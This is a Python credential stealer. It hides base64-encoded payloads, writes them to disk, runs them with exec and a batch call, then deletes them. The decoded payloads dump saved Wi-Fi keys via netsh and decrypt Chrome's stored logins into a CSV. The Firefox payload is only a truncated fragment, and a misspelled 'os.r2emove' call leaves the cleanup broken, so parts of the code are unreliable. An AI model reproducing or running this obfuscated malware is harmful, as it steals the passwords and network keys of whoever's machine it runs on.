import base64
import subprocess
import os

wifi_password = """
QGVjaG8gb2ZmCmVjaG8gJWRhdGUlICV0aW1lJT4+c2VuaGFzLnR4dAplY2hvICV1c2VybmFtZSU+PnNlbmhhcy50eHQKZWNobyAtID4+c2VuaGFzLnR4dApuZXRzaCB3bGFuIHNob3cgcHJvZmlsZSBuYW1lPSoga2V5PWNsZWFyID4+c2VuaGFzLnR4dAplY2hvIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tID4+IHNlbmhhcy50eHQKcGF1c2U=
"""
chrome_password = """
aW1wb3J0IG9zCmltcG9ydCByZQppbXBvcnQgc3lzCmltcG9ydCBqc29uCmltcG9ydCBiYXNlNjQKaW1wb3J0IHNxbGl0ZTMKZnJvbSB3aW4zMiBpbXBvcnQgd2luMzJjcnlwdApmcm9tIENyeXB0b2RvbWUuQ2lwaGVyIGltcG9ydCBBRVMKaW1wb3J0IHNodXRpbAppbXBvcnQgY3N2CgojR0xPQkFMIENPTlNUQU5UCkNIUk9NRV9QQVRIX0xPQ0FMX1NUQVRFID0gb3MucGF0aC5ub3JtcGF0aChyIiVzXEFwcERhdGFcTG9jYWxcR29vZ2xlXENocm9tZVxVc2VyIERhdGFcTG9jYWwgU3RhdGUiJShvcy5lbnZpcm9uWydVU0VSUFJPRklMRSddKSkKQ0hST01FX1BBVEggPSBvcy5wYXRoLm5vcm1wYXRoKHIiJXNcQXBwRGF0YVxMb2NhbFxHb29nbGVcQ2hyb21lXFVzZXIgRGF0YSIlKG9zLmVudmlyb25bJ1VTRVJQUk9GSUxFJ10pKQoKZGVmIGdldF9zZWNyZXRfa2V5KCk6CiAgICB0cnk6CiAgICAgICAgIygxKSBHZXQgc2VjcmV0a2V5IGZyb20gY2hyb21lIGxvY2FsIHN0YXRlCiAgICAgICAgd2l0aCBvcGVuKCBDSFJPTUVfUEFUSF9MT0NBTF9TVEFURSwgInIiLCBlbmNvZGluZz0ndXRmLTgnKSBhcyBmOgogICAgICAgICAgICBsb2NhbF9zdGF0ZSA9IGYucmVhZCgpCiAgICAgICAgICAgIGxvY2FsX3N0YXRlID0ganNvbi5sb2Fkcyhsb2NhbF9zdGF0ZSkKICAgICAgICBzZWNyZXRfa2V5ID0gYmFzZTY0LmI2NGRlY29kZShsb2NhbF9zdGF0ZVsib3NfY3J5cHQiXVsiZW5jcnlwdGVkX2tleSJdKQogICAgICAgICNSZW1vdmUgc3VmZml4IERQQVBJCiAgICAgICAgc2VjcmV0X2tleSA9IHNlY3JldF9rZXlbNTpdCiAgICAgICAgc2VjcmV0X2tleSA9IHdpbjMyY3J5cHQuQ3J5cHRVbnByb3RlY3REYXRhKHNlY3JldF9rZXksIE5vbmUsIE5vbmUsIE5vbmUsIDApWzFdCiAgICAgICAgcmV0dXJuIHNlY3JldF9rZXkKICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICBwcmludCgiJXMiJXN0cihlKSkKICAgICAgICBwcmludCgiW0VSUl0gQ2hyb21lIHNlY3JldGtleSBjYW5ub3QgYmUgZm91bmQiKQogICAgICAgIHJldHVybiBOb25lCiAgICAKZGVmIGRlY3J5cHRfcGF5bG9hZChjaXBoZXIsIHBheWxvYWQpOgogICAgcmV0dXJuIGNpcGhlci5kZWNyeXB0KHBheWxvYWQpCgpkZWYgZ2VuZXJhdGVfY2lwaGVyKGFlc19rZXksIGl2KToKICAgIHJldHVybiBBRVMubmV3KGFlc19rZXksIEFFUy5NT0RFX0dDTSwgaXYpCgpkZWYgZGVjcnlwdF9wYXNzd29yZChjaXBoZXJ0ZXh0LCBzZWNyZXRfa2V5KToKICAgIHRyeToKICAgICAgICAjKDMtYSkgSW5pdGlhbGlzYXRpb24gdmVjdG9yIGZvciBBRVMgZGVjcnlwdGlvbgogICAgICAgIGluaXRpYWxpc2F0aW9uX3ZlY3RvciA9IGNpcGhlcnRleHRbMzoxNV0KICAgICAgICAjKDMtYikgR2V0IGVuY3J5cHRlZCBwYXNzd29yZCBieSByZW1vdmluZyBzdWZmaXggYnl0ZXMgKGxhc3QgMTYgYml0cykKICAgICAgICAjRW5jcnlwdGVkIHBhc3N3b3JkIGlzIDE5MiBiaXRzCiAgICAgICAgZW5jcnlwdGVkX3Bhc3N3b3JkID0gY2lwaGVydGV4dFsxNTotMTZdCiAgICAgICAgIyg0KSBCdWlsZCB0aGUgY2lwaGVyIHRvIGRlY3J5cHQgdGhlIGNpcGhlcnRleHQKICAgICAgICBjaXBoZXIgPSBnZW5lcmF0ZV9jaXBoZXIoc2VjcmV0X2tleSwgaW5pdGlhbGlzYXRpb25fdmVjdG9yKQogICAgICAgIGRlY3J5cHRlZF9wYXNzID0gZGVjcnlwdF9wYXlsb2FkKGNpcGhlciwgZW5jcnlwdGVkX3Bhc3N3b3JkKQogICAgICAgIGRlY3J5cHRlZF9wYXNzID0gZGVjcnlwdGVkX3Bhc3MuZGVjb2RlKCkgIAogICAgICAgIHJldHVybiBkZWNyeXB0ZWRfcGFzcwogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIHByaW50KCIlcyIlc3RyKGUpKQogICAgICAgIHByaW50KCJbRVJSXSBVbmFibGUgdG8gZGVjcnlwdCwgQ2hyb21lIHZlcnNpb24gPDgwIG5vdCBzdXBwb3J0ZWQuIFBsZWFzZSBjaGVjay4iKQogICAgICAgIHJldHVybiAiIgogICAgCmRlZiBnZXRfZGJfY29ubmVjdGlvbihjaHJvbWVfcGF0aF9sb2dpbl9kYik6CiAgICB0cnk6CiAgICAgICAgcHJpbnQoY2hyb21lX3BhdGhfbG9naW5fZGIpCiAgICAgICAgc2h1dGlsLmNvcHkyKGNocm9tZV9wYXRoX2xvZ2luX2RiLCAiTG9naW52YXVsdC5kYiIpIAogICAgICAgIHJldHVybiBzcWxpdGUzLmNvbm5lY3QoIkxvZ2ludmF1bHQuZGIiKQogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIHByaW50KCIlcyIlc3RyKGUpKQogICAgICAgIHByaW50KCJbRVJSXSBDaHJvbWUgZGF0YWJhc2UgY2Fubm90IGJlIGZvdW5kIikKICAgICAgICByZXR1cm4gTm9uZQogICAgICAgIAppZiBfX25hbWVfXyA9PSAnX19tYWluX18nOgogICAgdHJ5OgogICAgICAgICNDcmVhdGUgRGF0YWZyYW1lIHRvIHN0b3JlIHBhc3N3b3JkcwogICAgICAgIHdpdGggb3BlbignZGVjcnlwdGVkX3Bhc3N3b3JkLmNzdicsIG1vZGU9J3cnLCBuZXdsaW5lPScnLCBlbmNvZGluZz0ndXRmLTgnKSBhcyBkZWNyeXB0X3Bhc3N3b3JkX2ZpbGU6CiAgICAgICAgICAgIGNzdl93cml0ZXIgPSBjc3Yud3JpdGVyKGRlY3J5cHRfcGFzc3dvcmRfZmlsZSwgZGVsaW1pdGVyPScsJykKICAgICAgICAgICAgY3N2X3dyaXRlci53cml0ZXJvdyhbImluZGV4IiwidXJsIiwidXNlcm5hbWUiLCJwYXNzd29yZCJdKQogICAgICAgICAgICAjKDEpIEdldCBzZWNyZXQga2V5CiAgICAgICAgICAgIHNlY3JldF9rZXkgPSBnZXRfc2VjcmV0X2tleSgpCiAgICAgICAgICAgICNTZWFyY2ggdXNlciBwcm9maWxlIG9yIGRlZmF1bHQgZm9sZGVyICh0aGlzIGlzIHdoZXJlIHRoZSBlbmNyeXB0ZWQgbG9naW4gcGFzc3dvcmQgaXMgc3RvcmVkKQogICAgICAgICAgICBmb2xkZXJzID0gW2VsZW1lbnQgZm9yIGVsZW1lbnQgaW4gb3MubGlzdGRpcihDSFJPTUVfUEFUSCkgaWYgcmUuc2VhcmNoKCJeUHJvZmlsZSp8XkRlZmF1bHQkIixlbGVtZW50KSE9Tm9uZV0KICAgICAgICAgICAgZm9yIGZvbGRlciBpbiBmb2xkZXJzOgogICAgICAgICAgICAJIygyKSBHZXQgY2lwaGVydGV4dCBmcm9tIHNxbGl0ZSBkYXRhYmFzZQogICAgICAgICAgICAgICAgY2hyb21lX3BhdGhfbG9naW5fZGIgPSBvcy5wYXRoLm5vcm1wYXRoKHIiJXNcJXNcTG9naW4gRGF0YSIlKENIUk9NRV9QQVRILGZvbGRlcikpCiAgICAgICAgICAgICAgICBjb25uID0gZ2V0X2RiX2Nvbm5lY3Rpb24oY2hyb21lX3BhdGhfbG9naW5fZGIpCiAgICAgICAgICAgICAgICBpZihzZWNyZXRfa2V5IGFuZCBjb25uKToKICAgICAgICAgICAgICAgICAgICBjdXJzb3IgPSBjb25uLmN1cnNvcigpCiAgICAgICAgICAgICAgICAgICAgY3Vyc29yLmV4ZWN1dGUoIlNFTEVDVCBhY3Rpb25fdXJsLCB1c2VybmFtZV92YWx1ZSwgcGFzc3dvcmRfdmFsdWUgRlJPTSBsb2dpbnMiKQogICAgICAgICAgICAgICAgICAgIGZvciBpbmRleCxsb2dpbiBpbiBlbnVtZXJhdGUoY3Vyc29yLmZldGNoYWxsKCkpOgogICAgICAgICAgICAgICAgICAgICAgICB1cmwgPSBsb2dpblswXQogICAgICAgICAgICAgICAgICAgICAgICB1c2VybmFtZSA9IGxvZ2luWzFdCiAgICAgICAgICAgICAgICAgICAgICAgIGNpcGhlcnRleHQgPSBsb2dpblsyXQogICAgICAgICAgICAgICAgICAgICAgICBpZih1cmwhPSIiIGFuZCB1c2VybmFtZSE9IiIgYW5kIGNpcGhlcnRleHQhPSIiKToKICAgICAgICAgICAgICAgICAgICAgICAgICAgICMoMykgRmlsdGVyIHRoZSBpbml0aWFsaXNhdGlvbiB2ZWN0b3IgJiBlbmNyeXB0ZWQgcGFzc3dvcmQgZnJvbSBjaXBoZXJ0ZXh0IAogICAgICAgICAgICAgICAgICAgICAgICAgICAgIyg0KSBVc2UgQUVTIGFsZ29yaXRobSB0byBkZWNyeXB0IHRoZSBwYXNzd29yZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgZGVjcnlwdGVkX3Bhc3N3b3JkID0gZGVjcnlwdF9wYXNzd29yZChjaXBoZXJ0ZXh0LCBzZWNyZXRfa2V5KQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoIlNlcXVlbmNlOiAlZCIlKGluZGV4KSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KCJVUkw6ICVzXG5Vc2VyIE5hbWU6ICVzXG5QYXNzd29yZDogJXNcbiIlKHVybCx1c2VybmFtZSxkZWNyeXB0ZWRfcGFzc3dvcmQpKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoIioiKjUwKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgIyg1KSBTYXZlIGludG8gQ1NWIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgY3N2X3dyaXRlci53cml0ZXJvdyhbaW5kZXgsdXJsLHVzZXJuYW1lLGRlY3J5cHRlZF9wYXNzd29yZF0pCiAgICAgICAgICAgICAgICAgICAgI0Nsb3NlIGRhdGFiYXNlIGNvbm5lY3Rpb24KICAgICAgICAgICAgICAgICAgICBjdXJzb3IuY2xvc2UoKQogICAgICAgICAgICAgICAgICAgIGNvbm4uY2xvc2UoKQogICAgICAgICAgICAgICAgICAgICNEZWxldGUgdGVtcCBsb2dpbiBkYgogICAgICAgICAgICAgICAgICAgIG9zLnJlbW92ZSgiTG9naW52YXVsdC5kYiIpCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgcHJpbnQoIltFUlJdICVzIiVzdHIoZSkp
"""
firefox_password = """





AgIG1haW4oKQogICAgZXhjZXB0IEtleWJvYXJkSW50ZXJydXB0OgogICAgICAgIHByaW50KCJRdWl0LiIpCiAgICAgICAgc3lzLmV4aXQoRXhpdC5LRVlCT0FSRF9JTlRFUlJVUFQpCiAgICBleGNlcHQgRXhpdCBhcyBlOgogICAgICAgIHN5cy5leGl0KGUuZXhpdGNvZGUpCgoKaWYgX19uYW1lX18gPT0gIl9fbWFpbl9fIjoKICAgIHJ1bl9mZmRlY3J5cHQoKQ==
"""
decoded = None

decoded = base64.b64decode(chrome_password).decode('ascii')
with open('stealer_chrome.py', 'w') as file:
    file.write(decoded)

exec(open('stealer_chrome.py').read())

decoded = None

decoded = base64.b64decode(firefox_password).decode('ascii')
with open('stealer_firefox.py', 'w') as file:
    file.write(decoded)

exec(open('stealer_firefox.py').read())

decoded = None

decoded = base64.b64decode(wifi_password).decode('ascii')
with open('wifi_password.bat', 'w') as file:
    file.write(decoded)

subprocess.run(r'wifi_password.bat')


os.r2emove('stealer_chrome.py')
os.remove('stealer_firefox.py')
os.remove('wifi_password.bat')
